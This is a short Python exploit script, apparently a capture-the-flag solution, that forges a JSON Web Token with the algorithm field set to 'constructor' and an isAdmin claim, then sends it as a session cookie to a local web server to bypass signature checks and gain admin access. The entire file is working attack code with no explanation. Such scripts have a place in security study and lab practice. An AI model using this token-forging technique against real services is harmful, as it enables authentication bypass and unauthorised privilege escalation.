import base64
import requests
import json


header = {"typ": "JWT", "alg": "constructor"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")


def base64_encode(str: str):
    return (
        base64.b64encode(str).replace(b"=", b"").replace(
            b"+", b"-").replace(b"/", b"_")
    )


headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"

res = requests.get("http://localhost:3000/",
                   cookies={"session": jwt})

print(res.text)
